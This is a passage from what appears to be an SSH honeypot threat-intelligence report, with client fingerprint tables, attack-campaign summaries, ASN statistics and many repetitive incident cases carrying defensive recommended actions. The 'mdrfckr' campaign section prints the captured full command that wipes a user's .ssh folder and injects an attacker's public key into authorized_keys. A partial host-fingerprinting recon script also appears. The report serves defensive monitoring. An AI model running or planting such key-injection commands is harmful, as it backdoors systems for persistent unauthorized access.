| `acaa53e0a7d7...` | Mirai/variant | 71 | 69 |
| `419da4c91ddb...` | Modern SSH client | 49 | 1 |
| `f555226df196...` | Mirai/variant | 32 | 12 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `16443846184e...` | Go SSH scanner | 87 | 3 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 77 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 71 | 69 | Mirai/variant |
| `419da4c91ddb...` | libssh | 49 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 32 | 12 | Mirai/variant |
| `95420f9d932d...` | libssh | 11 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 76 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 11 | 11 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `92.118.39.71`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `88.147.30.59`, `20.157.117.15`, `65.181.127.40`, `66.116.234.172`, `101.126.71.100`, `188.20.244.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **136** |
| Unique ASNs | **81** |
| High-Risk ASNs | **69** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 26 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 4 | HIGH |
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS7922` | Comcast Cable Communications, LLC | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (324)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c0115e775c8a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 10:56 |
| **Last Seen** | 2026-08-30 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 10:56:19` | `cowrie.session.connect` |
| `2026-08-30 10:56:19` | `cowrie.client.version` |
| `2026-08-30 10:56:19` | `cowrie.client.kex` |
| `2026-08-30 10:56:20` | `cowrie.login.success` |
| `2026-08-30 10:56:20` | `cowrie.direct-tcpip.request` |
| `2026-08-30 10:56:21` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 10:56:21` | `cowrie.direct-tcpip.data` |
| `2026-08-30 10:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c197e3ebdaa9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 10:56 |
| **Last Seen** | 2026-08-30 10:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 10:56:49` | `cowrie.session.connect` |
| `2026-08-30 10:56:49` | `cowrie.client.version` |
| `2026-08-30 10:56:49` | `cowrie.client.kex` |
| `2026-08-30 10:56:50` | `cowrie.login.success` |
| `2026-08-30 10:56:50` | `cowrie.direct-tcpip.request` |
| `2026-08-30 10:56:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 10:56:50` | `cowrie.direct-tcpip.data` |
| `2026-08-30 10:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e4ab8968b85

| Field | Detail |
|---|---|
| **Source IP** | `60.214.127[.]246` |
| **First Seen** | 2026-08-30 10:58 |
| **Last Seen** | 2026-08-30 10:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 10:58:17` | `cowrie.session.connect` |
| `2026-08-30 10:58:17` | `cowrie.client.version` |
| `2026-08-30 10:58:17` | `cowrie.client.kex` |
| `2026-08-30 10:58:20` | `cowrie.login.success` |
| `2026-08-30 10:58:21` | `cowrie.direct-tcpip.request` |
| `2026-08-30 10:58:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.214.127[.]246` to AbuseIPDB if not already reported
- [ ] Block `60.214.127[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88cf09f97b3b

| Field | Detail |
|---|---|
| **Source IP** | `218.22.0[.]200` |
| **First Seen** | 2026-08-30 11:03 |
| **Last Seen** | 2026-08-30 11:03 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:03:37` | `cowrie.session.connect` |
| `2026-08-30 11:03:39` | `cowrie.client.version` |
| `2026-08-30 11:03:39` | `cowrie.client.kex` |
| `2026-08-30 11:03:43` | `cowrie.login.success` |
| `2026-08-30 11:03:45` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:03:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.22.0[.]200` to AbuseIPDB if not already reported
- [ ] Block `218.22.0[.]200` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c149910a0f

| Field | Detail |
|---|---|
| **Source IP** | `207.219.222[.]29` |
| **First Seen** | 2026-08-30 11:03 |
| **Last Seen** | 2026-08-30 11:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:03:50` | `cowrie.session.connect` |
| `2026-08-30 11:03:51` | `cowrie.client.version` |
| `2026-08-30 11:03:51` | `cowrie.client.kex` |
| `2026-08-30 11:03:52` | `cowrie.login.success` |
| `2026-08-30 11:03:52` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:03:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.222[.]29` to AbuseIPDB if not already reported
- [ ] Block `207.219.222[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7545ea46f5c7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:05 |
| **Last Seen** | 2026-08-30 11:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:05:55` | `cowrie.session.connect` |
| `2026-08-30 11:05:55` | `cowrie.client.version` |
| `2026-08-30 11:05:55` | `cowrie.client.kex` |
| `2026-08-30 11:05:56` | `cowrie.login.success` |
| `2026-08-30 11:05:56` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:05:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:05:57` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:05:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eddf51a455f4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:07 |
| **Last Seen** | 2026-08-30 11:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:07:39` | `cowrie.session.connect` |
| `2026-08-30 11:07:39` | `cowrie.client.version` |
| `2026-08-30 11:07:39` | `cowrie.client.kex` |
| `2026-08-30 11:07:40` | `cowrie.login.success` |
| `2026-08-30 11:07:40` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:07:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:07:40` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35bc3569cf4e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-30 11:13 |
| **Last Seen** | 2026-08-30 11:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:13:39` | `cowrie.session.connect` |
| `2026-08-30 11:13:39` | `cowrie.client.version` |
| `2026-08-30 11:13:39` | `cowrie.client.kex` |
| `2026-08-30 11:13:40` | `cowrie.login.success` |
| `2026-08-30 11:13:40` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:13:40` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:13:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da18e728b2d2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:15 |
| **Last Seen** | 2026-08-30 11:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:15:26` | `cowrie.session.connect` |
| `2026-08-30 11:15:26` | `cowrie.client.version` |
| `2026-08-30 11:15:26` | `cowrie.client.kex` |
| `2026-08-30 11:15:27` | `cowrie.login.success` |
| `2026-08-30 11:15:27` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:15:27` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:15:27` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa746bd14616

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:18 |
| **Last Seen** | 2026-08-30 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:18:16` | `cowrie.session.connect` |
| `2026-08-30 11:18:16` | `cowrie.client.version` |
| `2026-08-30 11:18:17` | `cowrie.client.kex` |
| `2026-08-30 11:18:18` | `cowrie.login.success` |
| `2026-08-30 11:18:18` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:18:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:18:18` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:18:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00f3efcb0765

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]128` |
| **First Seen** | 2026-08-30 11:18 |
| **Last Seen** | 2026-08-30 11:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:18:34` | `cowrie.session.connect` |
| `2026-08-30 11:18:35` | `cowrie.client.version` |
| `2026-08-30 11:18:35` | `cowrie.client.kex` |
| `2026-08-30 11:18:36` | `cowrie.login.success` |
| `2026-08-30 11:18:36` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:18:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]128` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]128` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc33fcdd59b7

| Field | Detail |
|---|---|
| **Source IP** | `186.239.41[.]74` |
| **First Seen** | 2026-08-30 11:18 |
| **Last Seen** | 2026-08-30 11:19 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:18:48` | `cowrie.session.connect` |
| `2026-08-30 11:18:51` | `cowrie.client.version` |
| `2026-08-30 11:18:51` | `cowrie.client.kex` |
| `2026-08-30 11:18:53` | `cowrie.login.success` |
| `2026-08-30 11:18:57` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.239.41[.]74` to AbuseIPDB if not already reported
- [ ] Block `186.239.41[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b300ffada6c

| Field | Detail |
|---|---|
| **Source IP** | `222.129.37[.]110` |
| **First Seen** | 2026-08-30 11:23 |
| **Last Seen** | 2026-08-30 11:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0, Accept: application/json, text/plain, */*, Accept-Encoding: gzip, deflate, Connection: keep-alive, Cache-Control: no-cache` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:23:27` | `cowrie.session.connect` |
| `2026-08-30 11:23:28` | `cowrie.login.success` |
| `2026-08-30 11:23:28` | `cowrie.session.params` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:28` | `cowrie.command.failed` |
| `2026-08-30 11:23:28` | `cowrie.command.input` |
| `2026-08-30 11:23:29` | `cowrie.log.closed` |
| `2026-08-30 11:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.129.37[.]110` to AbuseIPDB if not already reported
- [ ] Block `222.129.37[.]110` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46a0aa263356

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:24 |
| **Last Seen** | 2026-08-30 11:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:24:54` | `cowrie.session.connect` |
| `2026-08-30 11:24:54` | `cowrie.client.version` |
| `2026-08-30 11:24:54` | `cowrie.client.kex` |
| `2026-08-30 11:24:55` | `cowrie.login.success` |
| `2026-08-30 11:24:55` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:24:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 11:24:56` | `cowrie.direct-tcpip.data` |
| `2026-08-30 11:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6703c743d24a

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-30 11:25 |
| **Last Seen** | 2026-08-30 11:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:25:05` | `cowrie.session.connect` |
| `2026-08-30 11:25:06` | `cowrie.client.version` |
| `2026-08-30 11:25:06` | `cowrie.client.kex` |
| `2026-08-30 11:25:09` | `cowrie.login.success` |
| `2026-08-30 11:25:10` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a82aa9705b06

| Field | Detail |
|---|---|
| **Source IP** | `180.76.112[.]91` |
| **First Seen** | 2026-08-30 11:25 |
| **Last Seen** | 2026-08-30 11:30 |
| **Session Duration** | 312s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:25:42` | `cowrie.session.connect` |
| `2026-08-30 11:25:53` | `cowrie.client.version` |
| `2026-08-30 11:25:53` | `cowrie.client.kex` |
| `2026-08-30 11:25:55` | `cowrie.login.success` |
| `2026-08-30 11:30:55` | `cowrie.session.file_upload` |
| `2026-08-30 11:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.112[.]91` to AbuseIPDB if not already reported
- [ ] Block `180.76.112[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ef0a373d83

| Field | Detail |
|---|---|
| **Source IP** | `118.91.176[.]243` |
| **First Seen** | 2026-08-30 11:26 |
| **Last Seen** | 2026-08-30 11:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:26:34` | `cowrie.session.connect` |
| `2026-08-30 11:26:35` | `cowrie.client.version` |
| `2026-08-30 11:26:35` | `cowrie.client.kex` |
| `2026-08-30 11:26:37` | `cowrie.login.success` |
| `2026-08-30 11:26:37` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.91.176[.]243` to AbuseIPDB if not already reported
- [ ] Block `118.91.176[.]243` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d920fd1c1e

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-08-30 11:26 |
| **Last Seen** | 2026-08-30 11:26 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:26:42` | `cowrie.session.connect` |
| `2026-08-30 11:26:43` | `cowrie.client.version` |
| `2026-08-30 11:26:43` | `cowrie.client.kex` |
| `2026-08-30 11:26:46` | `cowrie.login.success` |
| `2026-08-30 11:26:47` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:26:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e3fa0629aff

| Field | Detail |
|---|---|
| **Source IP** | `213.101.138[.]172` |
| **First Seen** | 2026-08-30 11:26 |
| **Last Seen** | 2026-08-30 11:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:26:46` | `cowrie.session.connect` |
| `2026-08-30 11:26:47` | `cowrie.client.version` |
| `2026-08-30 11:26:47` | `cowrie.client.kex` |
| `2026-08-30 11:26:48` | `cowrie.login.success` |
| `2026-08-30 11:26:49` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.101.138[.]172` to AbuseIPDB if not already reported
- [ ] Block `213.101.138[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbf1d73cbe39

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-08-30 11:26 |
| **Last Seen** | 2026-08-30 11:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 11:26:54` | `cowrie.session.connect` |
| `2026-08-30 11:26:55` | `cowrie.client.version` |
| `2026-08-30 11:26:55` | `cowrie.client.kex` |
| `2026-08-30 11:26:57` | `cowrie.login.success` |
| `2026-08-30 11:26:58` | `cowrie.direct-tcpip.request` |
| `2026-08-30 11:27:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9810757d578

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 11:29 |
| **Last Seen** | 2026-08-30 11:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
